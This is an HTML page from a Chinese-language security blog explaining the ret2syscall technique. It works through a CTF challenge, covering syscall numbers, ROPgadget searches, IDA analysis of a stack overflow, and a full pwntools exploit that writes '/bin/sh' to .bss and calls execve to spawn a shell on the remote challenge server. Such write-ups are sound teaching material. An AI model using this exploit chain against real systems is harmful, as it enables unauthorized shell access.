@@ -1,0 +1,679 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="介绍控制程序执行系统调用，获取 shell 判断如果没有system和开启了NX（栈不可执行）保护可以用（有system最好用ret2text，方便省事，没开NX直接ret2shellcode） 步骤32位和64位的syscall原理都是一样，只有传参和调用存在差异，以下一起说，做个对比。  32位系统调用使用 “ int 80h “ 64位系统调用使用 “ syscall “ （汇编代码就是sy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn——ret2syscall">
+<meta property="og:url" content="http://example.com/2023/09/20/Pwn%E2%80%94%E2%80%94ret2syscall/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="介绍控制程序执行系统调用，获取 shell 判断如果没有system和开启了NX（栈不可执行）保护可以用（有system最好用ret2text，方便省事，没开NX直接ret2shellcode） 步骤32位和64位的syscall原理都是一样，只有传参和调用存在差异，以下一起说，做个对比。  32位系统调用使用 “ int 80h “ 64位系统调用使用 “ syscall “ （汇编代码就是sy">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/pwn7-1.png">
+<meta property="og:image" content="http://example.com/images/pwn7-2.png">
+<meta property="article:published_time" content="2023-09-20T07:45:10.000Z">
+<meta property="article:modified_time" content="2023-09-20T08:37:13.628Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/pwn7-1.png">
+  
+  
+  
+  <title>Pwn——ret2syscall - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Welcome Π&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Pwn——ret2syscall"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-20 15:45" pubdate>
+          2023年9月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Pwn——ret2syscall</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>控制程序执行系统调用，获取 shell</p>
+<h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p>如果没有system和开启了NX（栈不可执行）保护可以用（有system最好用ret2text，方便省事，没开NX直接ret2shellcode）</p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>32位和64位的syscall原理都是一样，只有传参和调用存在差异，以下一起说，做个对比。</p>
+<ul>
+<li>32位系统调用使用 “ int 80h “</li>
+<li>64位系统调用使用 “ syscall “ （汇编代码就是syscall 直接ROPgadget–only查找即可）</li>
+</ul>
+<p>32的系统调用号与64位的不大一样 使用的时候最好百度一下</p>
+<ul>
+<li>32位     #define __NR_execve 11</li>
+<li>64位     #define __NR_execve 59   （0x3b）</li>
+</ul>
+<p>32位的系统调用号放在eax 传参依次是 <strong>EBX、ECX、EDX、ESI、EDI、EBP</strong><br>64位的系统调用号放在rax 传参依次是 <strong>RDI、RSI、RDX、R10、R8、R9</strong>  （和64位函数传参一样）</p>
+<p><strong>构造ROP chain:</strong></p>
+<ul>
+<li>没有&#x2F;bin&#x2F;sh字眼 只能自己加到bss区域，然后调用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)</li>
+</ul>
+<p>查找bss：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">readelf</span> -S pwn  <br>或<br>gdb中使用vmmap<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/pwn7-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>例如上图中这一段有w（可写）权限的地址应该都可以。</p>
+<ul>
+<li>有&#x2F;bin&#x2F;sh，溢出成功后，通过寻找特定的寄存器，以寄存器承载特定的数据，构造 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) 的汇编实现，将其部署栈中，劫持控制流实现获取 shell。</li>
+</ul>
+<p>如何构造汇编实现？(64bit)</p>
+<pre><code class="hljs">    execve(&quot;/bin/sh&quot;,NULL,NULL)
+    系统调用号，rax为59
+    第一个参数，rdi指向/bin/sh
+    第二个参数，为0
+    第三个参数，为0
+    第四个参数，为0
+    第五个参数，rsi为0
+    payload = &quot;A&quot;*offset(偏移量) + flat(rdi,bin_sh,rax_rdx_rbx,59,0,0,rsi,0,syscall)
+</code></pre>
+<p>查找各寄存器地址：</p>
+<pre><code class="hljs">    ROPgadget --binary ret2syscall --only &quot;syscall|ret&quot;
+    ROPgadget --binary ret2syscall --only &#39;pop|ret&#39; | grep &#39;rdx&#39;    #rdx=0x000000000040168b
+    
+</code></pre>
+<h2 id="例题（https-oj-blue-whale-me-challenges-pwnalpha）"><a href="#例题（https-oj-blue-whale-me-challenges-pwnalpha）" class="headerlink" title="例题（https://oj.blue-whale.me/challenges#pwnalpha）"></a>例题（<a target="_blank" rel="noopener" href="https://oj.blue-whale.me/challenges#pwnalpha%EF%BC%89">https://oj.blue-whale.me/challenges#pwnalpha）</a></h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>开启了NX保护，64位</p>
+<p>nc一下：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">nc vps1.blue-whale.<span class="hljs-keyword">me</span> <span class="hljs-number">19900</span>                             <br>Hello brave new challenger<br>Any <span class="hljs-keyword">last</span> <span class="hljs-built_in">words</span>?<br>lll<br>This will be <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> thing <span class="hljs-keyword">that</span> you <span class="hljs-built_in">say</span>: lll<br><br>Alas, you had no luck today.<br></code></pre></td></tr></table></figure>
+<p>从键盘输入，然后再输出。</p>
+<p>拖进ida64看看，</p>
+<p>这里打开ida以后出现了好多好多函数，但是没有main函数，想要快速找到主要函数可以查看String窗口并查找“Any last words”字符串，双击查看这个字符串是由什么函数使用的。用这个方法找到是sub_400B60()这个函数，f5看看这个函数的内容。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall sub<span class="hljs-constructor">_400B60(<span class="hljs-params">__int64</span> <span class="hljs-params">a1</span>, <span class="hljs-params">signed</span> <span class="hljs-params">__int64</span> <span class="hljs-params">a2</span>)</span><br>&#123;<br>  <span class="hljs-built_in">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-400h]</span><br><br>  sub<span class="hljs-constructor">_410390((<span class="hljs-params">signed</span> <span class="hljs-params">__int64</span>)</span><span class="hljs-string">&quot;Any last words?&quot;</span>, a2);<br>  sub<span class="hljs-constructor">_4498A0(0, &amp;<span class="hljs-params">buf</span>, 0x7D0uLL)</span>;<br>  return sub<span class="hljs-constructor">_40F710((<span class="hljs-params">__int64</span>)</span><span class="hljs-string">&quot;This will be the last thing that you say: %s\n&quot;</span>, &amp;buf);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>buf存在栈溢出。</p>
+<p>再查看一下sub_4498A0(),发现其系统调用read函数</p>
+<p><img src="/images/pwn7-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据分析，知道read函数这里产生了栈溢出，根据read知道，会用到系统调用。这里开启了NX保护，不能直接往栈里写shellcode，可以通过系统调用execave函数来获得shell。即在返回地址处进行系统调用，来执行execave（’&#x2F;bin&#x2F;sh’，0，0）命令来获得shell。</p>
+<p>根据上面总结的基础知识，execave的第一个参数（’&#x2F;bin&#x2F;sh’）放在rdi中，第二个和第三个参数0需放在rsi,rdx。系统调用号（59）存放在rax中 .</p>
+<p>利用ROPgadget 分别查找pop_rdi，pop_rsi,pop_rdx，pop_raxd的地址。</p>
+<p>由于程序中不存在“&#x2F;bin&#x2F;sh”,在这里需要用read函数将’&#x2F;bin&#x2F;sh’写入一个可写可执行段.bss段，根据上面提到的方法查找bss段。</p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">payload=padding + read(<span class="hljs-number">0</span>,<span class="hljs-keyword">bss_addr,len(‘/bin/sh\x00’)) </span>+ sysread_id + <span class="hljs-keyword">syscall_addr </span>+execave(<span class="hljs-keyword">bss_addr,0,0) </span>+ sysexecave_id +<span class="hljs-keyword">syscall_addr</span><br><span class="hljs-keyword"></span>```                         <br>可以与下面exp对照来看。<br><span class="hljs-comment">### 完整exp</span><br><br></code></pre></td></tr></table></figure>
+<p>from pwn import *</p>
+<h1 id="创建一个远程连接"><a href="#创建一个远程连接" class="headerlink" title="创建一个远程连接"></a>创建一个远程连接</h1><p>r &#x3D; remote(‘vps1.blue-whale.me’,19900)</p>
+<p>pop_rdi&#x3D;0x0000000000400686<br>pop_rsi&#x3D;0x00000000004101f3<br>pop_rdx&#x3D;0x00000000004498b5<br>pop_rax&#x3D;0x0000000000415664<br>syscall_addr &#x3D; 0x0000000000474E65<br>bss_addr &#x3D; 0x00000000006bb2e0</p>
+<p>payload &#x3D; b’a’*0x400 + b’b’*0x8 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(8) + p64(pop_rax) + p64(0) + p64(syscall_addr)</p>
+<p>payload +&#x3D; p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(0) +p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall_addr)</p>
+<p>r.send(payload)<br>r.send(‘&#x2F;bin&#x2F;sh\x00’)<br>r.interactive()</p>
+<pre><code class="hljs">这里p64(pop_rax) + p64(0)应该对应的是read系统调用号。p64(pop_rax) + p64(59)对应64位程序系统调用号
+
+附上系统调用号连接：https://filippo.io/linux-syscall-table/
+</code></pre>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Pwn——ret2syscall</div>
+      <div>http://example.com/2023/09/20/Pwn——ret2syscall/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E8%BF%9B%E9%98%B6%E7%BB%83%E4%B9%A0/" title="Pwn——ROP进阶练习">
+                        <span class="hidden-mobile">Pwn——ROP进阶练习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>XpaiX</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
